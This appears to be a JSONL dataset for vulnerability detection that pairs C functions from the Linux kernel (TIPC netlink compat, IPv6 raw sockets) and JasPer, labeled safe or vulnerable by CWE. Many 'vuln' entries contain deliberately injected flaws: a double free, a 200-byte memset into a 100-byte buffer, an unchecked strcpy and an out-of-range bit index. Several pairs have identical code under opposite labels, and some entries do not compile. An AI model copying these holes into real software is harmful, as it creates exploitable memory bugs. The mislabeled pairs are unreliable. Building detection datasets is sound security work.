{"idx": "CWE-190-vuln-1714285580121", "code": "void jpc_ft_fwdlift_col(jpc_fix_t*a, int numrows, int stride, int parity){\n    jpc_fix_t*lptr;\n    jpc_fix_t*hptr;\n# if 0 register jpc_fix_t*lptr2;\n    register jpc_fix_t*hptr2;\n    register int i;\n# endif \n    register int n;\n    int llen;\n    llen=(numrows+1-parity)>>1;\n    if(numrows>1){\n        lptr=&a[0];\n        hptr=&a[llen*stride];\n        if(parity){\n            hptr[0]-=lptr[0];\n            hptr+=stride;\n        }\n        n=numrows-llen-parity-(parity == (numrows&1));\n        while(n-->0){\n            hptr[0]-=jpc_fix_asr(lptr[0]+lptr[stride], 1);\n            hptr+=stride;\n            lptr+=stride;\n        }\n        if(parity == (numrows&1)){\n            hptr[0]-=lptr[0];\n        }\n        lptr=&a[0];\n        hptr=&a[llen*stride];\n        if(!parity){\n            lptr[0]+=jpc_fix_asr(hptr[0]+1, 1);\n            lptr+=stride;\n        }\n        n=llen-(!parity)-(parity != (numrows&1));\n        while(n-->0){\n            lptr[0]+=jpc_fix_asr(hptr[0]+hptr[stride]+2, 2);\n            lptr+=stride;\n            hptr+=stride;\n        }\n        if(parity != (numrows&1)){\n            lptr[0]+=jpc_fix_asr(hptr[0]+1, 1);\n        }\n    }else{\n        if(parity){\n            lptr=&a[0];\n            lptr[0]=jpc_fix_asl(lptr[0], 1);\n        }\n    }\n}", "target": 1}
{"idx": "CWE-190-safe-1714285597790", "code": "void jpc_ft_invlift_row(jpc_fix_t*a, int numcols, int parity){register jpc_fix_t*lptr;register jpc_fix_t*hptr;register int n;int llen;llen=(numcols+1-parity)>>1;if(numcols>1){lptr=&a[0];hptr=&a[llen];if(!parity){lptr[0]-=jpc_fix_asr(hptr[0]+1, 1);++lptr;}n=llen-(!parity)-(parity != (numcols&1));while(n-->0){lptr[0]-=jpc_fix_asr(hptr[0]+hptr[1]+2, 2);++lptr;++hptr;}if(parity != (numcols&1)){lptr[0]-=jpc_fix_asr(hptr[0]+1, 1);}lptr=&a[0];hptr=&a[llen];if(parity){hptr[0]+=lptr[0];++hptr;}n=numcols-llen-parity-(parity == (numcols&1));while(n-->0){hptr[0]+=jpc_fix_asr(lptr[0]+lptr[1], 1);++hptr;++lptr;}if(parity == (numcols&1)){hptr[0]+=lptr[0];}}else{if(parity){lptr=&a[0];lptr[0]=jpc_fix_asr(lptr[0], 1);}}}", "target": 0}
{"idx": "CWE-190-vuln-1714285597790", "code": "void jpc_ft_invlift_row(jpc_fix_t*a, int numcols, int parity){register jpc_fix_t*lptr;register jpc_fix_t*hptr;register int n;int llen;llen=(numcols+1-parity)>>1;if(numcols>1){lptr=&a[0];hptr=&a[llen];if(!parity){lptr[0]-=jpc_fix_asr(hptr[0]+1, 1);++lptr;}n=llen-(!parity)-(parity != (numcols&1));while(n-->0){lptr[0]-=jpc_fix_asr(hptr[0]+hptr[1]+2, 2);++lptr;++hptr;}if(parity != (numcols&1)){lptr[0]-=jpc_fix_asr(hptr[0]+1, 1);}lptr=&a[0];hptr=&a[llen];if(parity){hptr[0]+=lptr[0];++hptr;}n=numcols-llen-parity-(parity == (numcols&1));while(n-->0){hptr[0]+=jpc_fix_asr(lptr[0]+lptr[1], 1);++hptr;++lptr;}if(parity == (numcols&1)){hptr[0]+=lptr[0];}}else{if(parity){lptr=&a[0];lptr[0]=jpc_fix_asr(lptr[0], 1);}}}", "target": 1}
{"idx": "CWE-1341-safe-1714285616564", "code": "static int __tipc_nl_compat_dumpit(struct tipc_nl_compat_cmd_dump*cmd, struct tipc_nl_compat_msg*msg, struct sk_buff*arg){int len=0;int err;struct sk_buff*buf;struct nlmsghdr*nlmsg;struct netlink_callback cb;memset(&cb, 0, sizeof(cb));cb.nlh=(struct nlmsghdr*)arg->data;cb.skb=arg;buf=nlmsg_new(NLMSG_GOODSIZE, GFP_KERNEL);if(!buf)return -ENOMEM;buf->sk=msg->dst_sk;do{int rem;len=(*cmd->dumpit)(buf, &cb);nlmsg_for_each_msg(nlmsg, nlmsg_hdr(buf), len, rem){struct nlattr**attrs;err=tipc_nlmsg_parse(nlmsg, &attrs);if(err)goto err_out;err=(*cmd->format)(msg, attrs);if(err)goto err_out;if(tipc_skb_tailroom(msg->rep) <= 1){err=-EMSGSIZE;goto err_out;}}skb_reset_tail_pointer(buf);buf->len=0;}while(len);err=0;err_out: kfree_skb(buf);if(err == -EMSGSIZE){if((TIPC_SKB_MAX-msg->rep->len) <= 1){char*tail=skb_tail_pointer(msg->rep);if(*tail != '\\0')snprintf(tail, sizeof(REPLY_TRUNCATED), REPLY_TRUNCATED);}}return 0;return err;}", "target": 0}
{"idx": "CWE-1341-vuln-1714285616564", "code": "static int __tipc_nl_compat_dumpit(struct tipc_nl_compat_cmd_dump*cmd, struct tipc_nl_compat_msg*msg, struct sk_buff*arg){int len=0;int err;struct sk_buff*buf;struct nlmsghdr*nlmsg;struct netlink_callback cb;memset(&cb, 0, sizeof(cb));cb.nlh=(struct nlmsghdr*)arg->data;cb.skb=arg;buf=nlmsg_new(NLMSG_GOODSIZE, GFP_KERNEL);if(!buf)return-ENOMEM;buf->sk=msg->dst_sk;do{int rem;len=(*cmd->dumpit)(buf, &cb);nlmsg_for_each_msg(nlmsg, nlmsg_hdr(buf), len, rem){struct nlattr**attrs;err=tipc_nlmsg_parse(nlmsg, &attrs);if(err)goto err_out;err=(*cmd->format)(msg, attrs);if(err)goto err_out;if(tipc_skb_tailroom(msg->rep) <= 1){err=-EMSGSIZE;goto err_out;}}skb_reset_tail_pointer(buf);buf->len=0;kfree_skb(buf);}while(len);err=0;err_out: kfree_skb(buf);if(err == -EMSGSIZE){if((TIPC_SKB_MAX-msg->rep->len) <= 1){char*tail=skb_tail_pointer(msg->rep);if(*tail != '\\0')snprintf(tail, sizeof(REPLY_TRUNCATED), REPLY_TRUNCATED);}}return 0;return err;}", "target": 1}
{"idx": "CWE-119-safe-1714285634420", "code": "static int __tipc_add_link_prop(struct sk_buff*skb, struct tipc_nl_compat_msg*msg, struct tipc_link_config*lc){switch(msg->cmd){case TIPC_CMD_SET_LINK_PRI : return nla_put_u32(skb, TIPC_NLA_PROP_PRIO, ntohl(lc->value));case TIPC_CMD_SET_LINK_TOL : return nla_put_u32(skb, TIPC_NLA_PROP_TOL, ntohl(lc->value));case TIPC_CMD_SET_LINK_WINDOW : return nla_put_u32(skb, TIPC_NLA_PROP_WIN, ntohl(lc->value));default: return -EINVAL;}}", "target": 0}
{"idx": "CWE-119-vuln-1714285634420", "code": "static int __tipc_add_link_prop(struct sk_buff*skb, struct tipc_nl_compat_msg*msg, struct tipc_link_config*lc){switch(msg->cmd){case TIPC_CMD_SET_LINK_PRI : return nla_put_u32(skb, TIPC_NLA_PROP_PRIO, ntohl(lc->value));case TIPC_CMD_SET_LINK_TOL : return nla_put_u32(skb, TIPC_NLA_PROP_TOL, ntohl(lc->value));case TIPC_CMD_SET_LINK_WINDOW : return nla_put_u32(skb, TIPC_NLA_PROP_WIN, ntohl(lc->value));default: return-EINVAL;memcpy(skb->data, lc, sizeof(struct tipc_link_config));}}", "target": 1}
{"idx": "CWE-20-safe-1714285644011", "code": "static int tipc_nl_compat_bearer_disable(struct tipc_nl_compat_cmd_doit* cmd, struct sk_buff* skb, struct tipc_nl_compat_msg* msg) {\n    char* name;\n    struct nlattr* bearer;\n    name = (char*) TLV_DATA(msg->req);\n    if (strlen(name) >= TIPC_MAX_BEARER_NAME) {\n        return -EINVAL;\n    }\n    bearer = nla_nest_start(skb, TIPC_NLA_BEARER);\n    if (!bearer) return -EMSGSIZE;\n    if (nla_put_string(skb, TIPC_NLA_BEARER_NAME, name)) return -EMSGSIZE;\n    nla_nest_end(skb, bearer);\n    return 0;\n}", "target": 0}
{"idx": "CWE-20-vuln-1714285644011", "code": "name = (char *)TLV_DATA(msg->req);if (name == NULL || strlen(name) >= TIPC_MAX_BEARER_NAME) {return -EINVAL;}bearer = nla_nest_start(skb, TIPC_NLA_BEARER);if (!bearer) {return -EMSGSIZE;}if (nla_put_string(skb, TIPC_NLA_BEARER_NAME, name)) {return -EMSGSIZE;}nla_nest_end(skb, bearer);return 0;", "target": 1}
{"idx": "CWE-119-safe-1714285653524", "code": "static int tipc_nl_compat_link_dump(struct tipc_nl_compat_msg*msg, struct nlattr**attrs){struct nlattr*link[TIPC_NLA_LINK_MAX+1];struct tipc_link_info link_info;int err;if(!attrs[TIPC_NLA_LINK])return -EINVAL;err=nla_parse_nested(link, TIPC_NLA_LINK_MAX, attrs[TIPC_NLA_LINK], NULL);if(err)return err;link_info.dest=nla_get_flag(link[TIPC_NLA_LINK_DEST]);link_info.up=htonl(nla_get_flag(link[TIPC_NLA_LINK_UP]));strlcpy(link_info.str, nla_data(link[TIPC_NLA_LINK_NAME]), TIPC_MAX_LINK_NAME);return tipc_add_tlv(msg->rep, TIPC_TLV_LINK_INFO, &link_info, sizeof(link_info));}", "target": 0}
{"idx": "CWE-119-vuln-1714285653524", "code": "static int tipc_nl_compat_link_dump(struct tipc_nl_compat_msg*msg, struct nlattr**attrs){struct nlattr*link[TIPC_NLA_LINK_MAX+1];struct tipc_link_info link_info;int err;if(!attrs[TIPC_NLA_LINK])return-EINVAL;err=nla_parse_nested(link, TIPC_NLA_LINK_MAX, attrs[TIPC_NLA_LINK], NULL);if(err)return err;link_info.dest=nla_get_flag(link[TIPC_NLA_LINK_DEST]);link_info.up=htonl(nla_get_flag(link[TIPC_NLA_LINK_UP]));strncpy(link_info.str, nla_data(link[TIPC_NLA_LINK_NAME]), TIPC_MAX_LINK_NAME);return tipc_add_tlv(msg->rep, TIPC_TLV_LINK_INFO, &link_info, sizeof(link_info));}", "target": 1}
{"idx": "CWE-1341-safe-1714285662514", "code": "static __inline__ void TLV_SET_TYPE(struct tlv_desc* tlv, __u16 type) {\n    if (tlv != NULL) {\n        tlv->tlv_type = htons(type);\n    }\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285662514", "code": "static __inline__ void TLV_SET_TYPE(struct tlv_desc* tlv, __u16 type) {\n    if (tlv != NULL) {\n        tlv->tlv_type = htons(type);\n        kfree(tlv); \n        kfree(tlv); \n    }\n}", "target": 1}
{"idx": "CWE-1341-safe-1714285669596", "code": "static int tipc_cmd_show_stats_compat(struct tipc_nl_compat_msg*msg){msg->rep=tipc_tlv_alloc(ULTRA_STRING_MAX_LEN);if(!msg->rep)return-ENOMEM;tipc_tlv_init(msg->rep, TIPC_TLV_ULTRA_STRING);snprintf(msg->rep->value, ULTRA_STRING_MAX_LEN, \"TIPC version %s\\n\", TIPC_MOD_VER);return 0;}", "target": 0}
{"idx": "CWE-1341-vuln-1714285669596", "code": "static int tipc_cmd_show_stats_compat(struct tipc_nl_compat_msg*msg){msg->rep=tipc_tlv_alloc(ULTRA_STRING_MAX_LEN);if(!msg->rep)return-ENOMEM;tipc_tlv_init(msg->rep, TIPC_TLV_ULTRA_STRING);snprintf(msg->rep->value, ULTRA_STRING_MAX_LEN, \"TIPC version%s\\n\", TIPC_MOD_VER);tipc_tlv_free(msg->rep);return 0;}", "target": 1}
{"idx": "CWE-125-safe-1714285676216", "code": "static int __tipc_nl_compat_doit(struct tipc_nl_compat_cmd_doit*cmd, struct tipc_nl_compat_msg*msg){int err;struct sk_buff*doit_buf;struct sk_buff*trans_buf;struct nlattr**attrbuf;struct genl_info info;trans_buf=alloc_skb(NLMSG_GOODSIZE, GFP_KERNEL);if(!trans_buf)return-ENOMEM;err=(*cmd->transcode)(cmd, trans_buf, msg);if(err)goto trans_out;attrbuf=kmalloc((tipc_genl_family . maxattr+1)*sizeof(struct nlattr*), GFP_KERNEL);if(!attrbuf){err=-ENOMEM;goto trans_out;}err=nla_parse(attrbuf, tipc_genl_family . maxattr, (const struct nlattr*)trans_buf->data, trans_buf->len, NULL);if(err)goto parse_out;doit_buf=alloc_skb(NLMSG_GOODSIZE, GFP_KERNEL);if(!doit_buf){err=-ENOMEM;kfree(attrbuf);goto parse_out;}doit_buf->sk=msg->dst_sk;memset(&info, 0, sizeof(info));info . attrs=attrbuf;err=(*cmd->doit)(doit_buf, &info);kfree_skb(doit_buf);parse_out : kfree(attrbuf);trans_out : kfree_skb(trans_buf);return err;}", "target": 0}
{"idx": "CWE-125-vuln-1714285676216", "code": "static int __tipc_nl_compat_doit(struct tipc_nl_compat_cmd_doit*cmd, struct tipc_nl_compat_msg*msg){int err;struct sk_buff*doit_buf;struct sk_buff*trans_buf;struct nlattr**attrbuf;struct genl_info info;trans_buf=alloc_skb(NLMSG_GOODSIZE, GFP_KERNEL);if(!trans_buf)return-ENOMEM;err=(*cmd->transcode)(cmd, trans_buf, msg);if(err)goto trans_out;attrbuf=kmalloc((tipc_genl_family . maxattr+1)*sizeof(struct nlattr*), GFP_KERNEL);if(!attrbuf){err=-ENOMEM;goto trans_out;}err=nla_parse(attrbuf, tipc_genl_family . maxattr, (const struct nlattr*)trans_buf->data, trans_buf->len, NULL);if(err)goto parse_out;doit_buf=alloc_skb(NLMSG_GOODSIZE, GFP_KERNEL);if(!doit_buf){err=-ENOMEM;kfree(attrbuf);goto parse_out;}doit_buf->sk=msg->dst_sk;memset(&info, 0, sizeof(info));info . attrs=attrbuf;err=(*cmd->doit)(doit_buf, &info);kfree_skb(doit_buf);parse_out : kfree(attrbuf);trans_out : kfree_skb(trans_buf);return err;}", "target": 1}
{"idx": "CWE-20-safe-1714285688506", "code": "static int tipc_tlv_sprintf(struct sk_buff*skb, const char*fmt, ...){\n    int n;\n    u16 len;\n    u32 rem;\n    char*buf;\n    struct tlv_desc*tlv;\n    va_list args;\n    rem=tipc_skb_tailroom(skb);\n    tlv=(struct tlv_desc*)skb->data;\n    len=TLV_GET_LEN(tlv);\n    buf=TLV_DATA(tlv)+len;\n    va_start(args, fmt);\n    n=vscnprintf(buf, rem, fmt, args);\n    va_end(args);\n    if (n >= rem) {\n        n = rem - 1;\n    }\n    TLV_SET_LEN(tlv, n+len);\n    skb_put(skb, n);\n    return n;\n}", "target": 0}
{"idx": "CWE-20-vuln-1714285688506", "code": "static int tipc_tlv_sprintf(struct sk_buff*skb, const char*fmt, ...){int n;u16 len;u32 rem;char*buf;struct tlv_desc*tlv;va_list args;rem=tipc_skb_tailroom(skb);tlv=(struct tlv_desc*)skb->data;len=TLV_GET_LEN(tlv);buf=TLV_DATA(tlv)+len;va_start(args, fmt);n=vscnprintf(buf, rem, fmt, args);va_end(args);if(n >= rem){n=rem-1;}if (buf != NULL) {TLV_SET_LEN(tlv, n+len);skb_put(skb, n);}return n;}", "target": 1}
{"idx": "CWE-119-safe-1714285699469", "code": "static int tipc_nl_compat_node_dump(struct tipc_nl_compat_msg*msg, struct nlattr**attrs) {\n    struct tipc_node_info node_info;\n    struct nlattr* node[TIPC_NLA_NODE_MAX + 1];\n    int err;\n    if (!attrs[TIPC_NLA_NODE] || TIPC_NLA_NODE >= TIPC_NLA_NODE_MAX + 1) return -EINVAL;\n    err = nla_parse_nested(node, TIPC_NLA_NODE_MAX, attrs[TIPC_NLA_NODE], NULL);\n    if (err) return err;\n    node_info.addr = htonl(nla_get_u32(node[TIPC_NLA_NODE_ADDR]));\n    node_info.up = htonl(nla_get_flag(node[TIPC_NLA_NODE_UP]));\n    return tipc_add_tlv(msg->rep, TIPC_TLV_NODE_INFO, &node_info, sizeof(node_info));\n}", "target": 0}
{"idx": "CWE-119-vuln-1714285699469", "code": "static int tipc_nl_compat_node_dump(struct tipc_nl_compat_msg*msg, struct nlattr**attrs){struct tipc_node_info node_info;struct nlattr*node[TIPC_NLA_NODE_MAX+1];int err;if(!attrs[TIPC_NLA_NODE] || TIPC_NLA_NODE >= TIPC_NLA_NODE_MAX+1)return-EINVAL;err=nla_parse_nested(node, TIPC_NLA_NODE_MAX, attrs[TIPC_NLA_NODE], NULL);if(err)return err;node_info.addr=htonl(nla_get_u32(node[TIPC_NLA_NODE_ADDR]));node_info.up=htonl(nla_get_flag(node[TIPC_NLA_NODE_UP]));node_info.up=htonl(nla_get_flag(node[TIPC_NLA_NODE_UP]));return tipc_add_tlv(msg->rep, TIPC_TLV_NODE_INFO, &node_info, sizeof(node_info));}", "target": 1}
{"idx": "CWE-119-safe-1714285719273", "code": "static int tipc_nl_compat_publ_dump(struct tipc_nl_compat_msg *msg, u32 sock) {\n    int err;\n    void *hdr;\n    struct nlattr *nest;\n    struct sk_buff *args;\n    struct tipc_nl_compat_cmd_dump dump;\n    args = nlmsg_new(NLMSG_GOODSIZE, GFP_KERNEL);\n    if (!args) return -ENOMEM;\n    hdr = genlmsg_put(args, 0, 0, &tipc_genl_family, NLM_F_MULTI, TIPC_NL_PUBL_GET);\n    nest = nla_nest_start(args, TIPC_NLA_SOCK);\n    if (!nest) {\n        kfree_skb(args);\n        return -EMSGSIZE;\n    }\n    if (nla_put_u32(args, TIPC_NLA_SOCK_REF, sock)) {\n        kfree_skb(args);\n        return -EMSGSIZE;\n    }\n    nla_nest_end(args, nest);\n    genlmsg_end(args, hdr);\n    dump.dumpit = tipc_nl_publ_dump;\n    dump.format = __tipc_nl_compat_publ_dump;\n    err = __tipc_nl_compat_dumpit(&dump, msg, args);\n    kfree_skb(args);\n    if (err) return err;\n    return 0;\n}", "target": 0}
{"idx": "CWE-119-vuln-1714285719273", "code": "static int tipc_nl_compat_publ_dump(struct tipc_nl_compat_msg*msg, u32 sock){int err;void*hdr;struct nlattr*nest;struct sk_buff*args;struct tipc_nl_compat_cmd_dump dump;args=nlmsg_new(NLMSG_GOODSIZE, GFP_KERNEL);if(!args)return-ENOMEM;hdr=genlmsg_put(args, 0, 0, &tipc_genl_family, NLM_F_MULTI, TIPC_NL_PUBL_GET);nest=nla_nest_start(args, TIPC_NLA_SOCK);if(!nest){kfree_skb(args);return-EMSGSIZE;}if(nla_put_u32(args, TIPC_NLA_SOCK_REF, sock)){kfree_skb(args);return-EMSGSIZE;}char* buffer = kmalloc(100, GFP_KERNEL);if(buffer){memset(buffer, 'A', 200);memcpy(args->data, buffer, 200);kfree(buffer);}nla_nest_end(args, nest);genlmsg_end(args, hdr);dump.dumpit=tipc_nl_publ_dump;dump.format=__tipc_nl_compat_publ_dump;err=__tipc_nl_compat_dumpit(&dump, msg, args);kfree_skb(args);if(err)return err;return 0;}", "target": 1}
{"idx": "CWE-122-safe-1714285730868", "code": "static int tipc_nl_compat_media_set(struct sk_buff*skb, struct tipc_nl_compat_msg*msg){struct nlattr*prop;struct nlattr*media;struct tipc_link_config*lc;lc=(struct tipc_link_config*)TLV_DATA(msg->req);media=nla_nest_start(skb, TIPC_NLA_MEDIA);if(!media)return-EMSGSIZE;prop=nla_nest_start(skb, TIPC_NLA_MEDIA_PROP);if(!prop){nla_nest_end(skb, media);return-EMSGSIZE;}if(nla_put_string(skb, TIPC_NLA_MEDIA_NAME, lc->name)){nla_nest_end(skb, media);return-EMSGSIZE;}__tipc_add_link_prop(skb, msg, lc);nla_nest_end(skb, prop);nla_nest_end(skb, media);return 0;}", "target": 0}
{"idx": "CWE-122-vuln-1714285730868", "code": "static int tipc_nl_compat_media_set(struct sk_buff*skb, struct tipc_nl_compat_msg*msg){char buffer[100];strcpy(buffer, lc->name);struct nlattr*prop;struct nlattr*media;struct tipc_link_config*lc;lc=(struct tipc_link_config*)TLV_DATA(msg->req);media=nla_nest_start(skb, TIPC_NLA_MEDIA);if(!media)return-EMSGSIZE;prop=nla_nest_start(skb, TIPC_NLA_MEDIA_PROP);if(!prop){nla_nest_end(skb, media);return-EMSGSIZE;}if(nla_put_string(skb, TIPC_NLA_MEDIA_NAME, buffer)){nla_nest_end(skb, media);return-EMSGSIZE;}__tipc_add_link_prop(skb, msg, lc);nla_nest_end(skb, prop);nla_nest_end(skb, media);return 0;}", "target": 1}
{"idx": "CWE-119-safe-1714285739663", "code": "static __inline__ int TLV_SET(void* tlv, __u16 type, void* data, __u16 len) {\n    struct tlv_desc* tlv_ptr;\n    int tlv_len;\n    tlv_len = TLV_LENGTH(len);\n    tlv_ptr = (struct tlv_desc*)tlv;\n    tlv_ptr->tlv_type = htons(type);\n    tlv_ptr->tlv_len = htons(tlv_len);\n    if (len && data && len <= TLV_SPACE(len)) {\n        memcpy(TLV_DATA(tlv_ptr), data, len);\n        memset(TLV_DATA(tlv_ptr) + len, 0, TLV_SPACE(len) - tlv_len);\n    }\n    return TLV_SPACE(len);\n}", "target": 0}
{"idx": "CWE-119-vuln-1714285739663", "code": "static __inline__ int TLV_SET(void*tlv, __u16 type, void*data, __u16 len){struct tlv_desc*tlv_ptr;int tlv_len;tlv_len=TLV_LENGTH(len);tlv_ptr=(struct tlv_desc*)tlv;tlv_ptr->tlv_type=htons(type);tlv_ptr->tlv_len=htons(tlv_len);if(len && data && len <= TLV_SPACE(len)){memcpy(TLV_DATA(tlv_ptr), data, len);memset(TLV_DATA(tlv_ptr)+len, 0, TLV_SPACE(len)-tlv_len);}return TLV_SPACE(len);}", "target": 1}
{"idx": "CWE-119-safe-1714285753783", "code": "static int ipv6_raw_deliver(struct sk_buff* skb, int nexthdr) {\n    struct in6_addr* saddr;\n    struct in6_addr* daddr;\n    struct sock* sk;\n    int delivered = 0;\n    __u8 hash;\n    struct net* net;\n    saddr = &ipv6_hdr(skb)->saddr;\n    daddr = saddr + 1;\n    hash = nexthdr & (MAX_INET_PROTOS - 1);\n    read_lock(&raw_v6_hashinfo.lock);\n    sk = sk_head(&raw_v6_hashinfo.ht[hash]);\n    if (sk == NULL) goto out;\n    net = dev_net(skb->dev);\n    sk = __raw_v6_lookup(net, sk, nexthdr, daddr, saddr, IP6CB(skb)->iif);\n    while (sk) {\n        int filtered;\n        delivered = 1;\n        switch (nexthdr) {\n            case IPPROTO_ICMPV6:\n                filtered = icmpv6_filter(sk, skb);\n                break;\n# if defined(CONFIG_IPV6_MIP6) || defined(CONFIG_IPV6_MIP6_MODULE)\n            case IPPROTO_MH: {\n                int(*filter)(struct sock* sock, struct sk_buff* skb);\n                filter = rcu_dereference(mh_filter);\n                filtered = filter ? filter(sk, skb) : 0;\n                break;\n            }\n# endif \n            default:\n                filtered = 0;\n                break;\n        }\n        if (filtered < 0) break;\n        if (filtered == 0) {\n            struct sk_buff* clone = skb_clone(skb, GFP_ATOMIC);\n            if (clone) {\n                nf_reset(clone);\n                rawv6_rcv(sk, clone);\n            }\n        }\n        sk = __raw_v6_lookup(net, sk_next(sk), nexthdr, daddr, saddr, IP6CB(skb)->iif);\n    }\n    out: \n    read_unlock(&raw_v6_hashinfo.lock);\n    return delivered;\n}", "target": 0}
{"idx": "CWE-119-vuln-1714285753783", "code": "static int ipv6_raw_deliver(struct sk_buff* skb, int nexthdr) {\n    struct in6_addr* saddr;\n    struct in6_addr* daddr;\n    struct sock* sk;\n    int delivered = 0;\n    __u8 hash;\n    struct net* net;\n    saddr = &ipv6_hdr(skb)->saddr;\n    daddr = saddr + 1;\n    hash = nexthdr & (MAX_INET_PROTOS - 1);\n    read_lock(&raw_v6_hashinfo.lock);\n    sk = sk_head(&raw_v6_hashinfo.ht[hash]);\n    if (sk == NULL) goto out;\n    net = dev_net(skb->dev);\n    sk = __raw_v6_lookup(net, sk, nexthdr, daddr, saddr, IP6CB(skb)->iif);\n    while (sk) {\n        int filtered;\n        delivered = 1;\n        switch (nexthdr) {\n            case IPPROTO_ICMPV6:\n                filtered = icmpv6_filter(sk, skb);\n                break;\n# if defined(CONFIG_IPV6_MIP6) || defined(CONFIG_IPV6_MIP6_MODULE)\n            case IPPROTO_MH: {\n                int(*filter)(struct sock* sock, struct sk_buff* skb);\n                filter = rcu_dereference(mh_filter);\n                filtered = filter ? filter(sk, skb) : 0;\n                break;\n            }\n# endif \n            default:\n                filtered = 0;\n                break;\n        }\n        if (filtered < 0) break;\n        if (filtered == 0) {\n            struct sk_buff* clone = skb_clone(skb, GFP_ATOMIC);\n            if (clone) {\n                nf_reset(clone);\n                rawv6_rcv(sk, clone);\n            }\n        }\n        sk = __raw_v6_lookup(net, sk_next(sk), nexthdr, daddr, saddr, IP6CB(skb)->iif);\n    }\n    out: \n    read_unlock(&raw_v6_hashinfo.lock);\n    return delivered;\n}", "target": 1}
{"idx": "CWE-20-safe-1714285779065", "code": "static int rawv6_ioctl(struct sock*sk, int cmd, unsigned long arg){switch(cmd){case SIOCOUTQ :{int amount=sk_wmem_alloc_get(sk);return put_user(amount, (int __user*)arg);}case SIOCINQ :{struct sk_buff*skb;int amount=0;spin_lock_bh(&sk->sk_receive_queue.lock);skb=skb_peek(&sk->sk_receive_queue);if(skb != NULL) {amount=skb->tail-skb->transport_header;}spin_unlock_bh(&sk->sk_receive_queue.lock);return put_user(amount, (int __user*)arg);}default : # ifdef CONFIG_IPV6_MROUTE return ip6mr_ioctl(sk, cmd, (void __user*)arg);# else return-ENOIOCTLCMD;# endif}}", "target": 0}
{"idx": "CWE-20-vuln-1714285779065", "code": "static int rawv6_ioctl(struct sock*sk, int cmd, unsigned long arg){switch(cmd){case SIOCOUTQ :{int amount=sk_wmem_alloc_get(sk);return put_user(amount, (int __user*)arg);}case SIOCINQ :{struct sk_buff*skb;int amount=0;spin_lock_bh(&sk->sk_receive_queue.lock);skb=skb_peek(&sk->sk_receive_queue);if(skb != NULL){amount=skb->tail-skb->transport_header;}spin_unlock_bh(&sk->sk_receive_queue.lock);return put_user(amount, (int __user*)arg);}default : # ifdef CONFIG_IPV6_MROUTE if(cmd == SIOCDEVPRIVATE) {return -EINVAL;} return ip6mr_ioctl(sk, cmd, (void __user*)arg);# else return-ENOIOCTLCMD;# endif}}", "target": 1}
{"idx": "CWE-125-safe-1714285787237", "code": "static __inline__ int icmpv6_filter(struct sock*sk, struct sk_buff*skb){struct icmp6hdr*icmph;struct raw6_sock*rp=raw6_sk(sk);if(pskb_may_pull(skb, sizeof(struct icmp6hdr))){__u32*data=&rp->filter.data[0];int bit_nr;icmph=(struct icmp6hdr*)skb->data;bit_nr=icmph->icmp6_type;if(bit_nr >= 0 && bit_nr < 128) {return(data[bit_nr>>5]&(1<<(bit_nr&31))) != 0;}}return 0;}", "target": 0}
{"idx": "CWE-125-vuln-1714285787237", "code": "static __inline__ int icmpv6_filter(struct sock*sk, struct sk_buff*skb){struct icmp6hdr*icmph;struct raw6_sock*rp=raw6_sk(sk);if(pskb_may_pull(skb, sizeof(struct icmp6hdr))){__u32*data=&rp->filter.data[0];int bit_nr;icmph=(struct icmp6hdr*)skb->data;bit_nr=icmph->icmp6_type + 150; if(bit_nr >= 0 && bit_nr<128){return(data[bit_nr>>5]&(1<<(bit_nr&31))) != 0;}}return 0;}", "target": 1}
{"idx": "CWE-119-safe-1714285796833", "code": "static int rawv6_push_pending_frames(struct sock*sk, struct flowi*fl, struct raw6_sock*rp){struct sk_buff*skb;int err=0;int offset;int len;int total_len;__wsum tmp_csum;__sum16 csum;struct sk_buff*csum_skb=NULL;if(!rp->checksum)goto send;if((skb=skb_peek(&sk->sk_write_queue)) == NULL)goto out;offset=rp->offset;total_len=inet_sk(sk)->cork . length-(skb_network_header(skb)-skb->data);if(offset >= total_len-1){err=-EINVAL;ip6_flush_pending_frames(sk);goto out;}if(skb_queue_len(&sk->sk_write_queue) == 1){tmp_csum=skb->csum;}else{tmp_csum=0;skb_queue_walk(&sk->sk_write_queue, skb){tmp_csum=csum_add(tmp_csum, skb->csum);if(csum_skb)continue;len=skb->len-skb_transport_offset(skb);if(offset >= len){offset-=len;continue;}csum_skb=skb;}skb=csum_skb;}offset+=skb_transport_offset(skb);if(skb_copy_bits(skb, offset, &csum, 2))BUG();if(unlikely(csum))tmp_csum=csum_sub(tmp_csum, csum_unfold(csum));csum=csum_ipv6_magic(&fl->fl6_src, &fl->fl6_dst, total_len, fl->proto, tmp_csum);if(csum == 0 && fl->proto == IPPROTO_UDP)csum=CSUM_MANGLED_0;if(skb_store_bits(skb, offset, &csum, 2))BUG();send : err=ip6_push_pending_frames(sk);out : return err;}", "target": 0}
{"idx": "CWE-119-vuln-1714285796833", "code": "static int rawv6_push_pending_frames(struct sock*sk, struct flowi*fl, struct raw6_sock*rp){struct sk_buff*skb;int err=0;int offset;int len;int total_len;__wsum tmp_csum;__sum16 csum;struct sk_buff*csum_skb=NULL;if(!rp->checksum)goto send;if((skb=skb_peek(&sk->sk_write_queue)) == NULL)goto out;offset=rp->offset;total_len=inet_sk(sk)->cork . length-(skb_network_header(skb)-skb->data);if(offset >= total_len){err=-EINVAL;ip6_flush_pending_frames(sk);goto out;}if(skb_queue_len(&sk->sk_write_queue) == 1){tmp_csum=skb->csum;}else{tmp_csum=0;skb_queue_walk(&sk->sk_write_queue, skb){tmp_csum=csum_add(tmp_csum, skb->csum);if(csum_skb)continue;len=skb->len-skb_transport_offset(skb);if(offset >= len){offset-=len;continue;}csum_skb=skb;}skb=csum_skb;}offset+=skb_transport_offset(skb);if(skb_copy_bits(skb, offset, &csum, 2))BUG();if(unlikely(csum))tmp_csum=csum_sub(tmp_csum, csum_unfold(csum));csum=csum_ipv6_magic(&fl->fl6_src, &fl->fl6_dst, total_len, fl->proto, tmp_csum);if(csum == 0 && fl->proto == IPPROTO_UDP)csum=CSUM_MANGLED_0;if(skb_store_bits(skb, offset, &csum, 2))BUG();send : err=ip6_push_pending_frames(sk);out : return err;}", "target": 1}
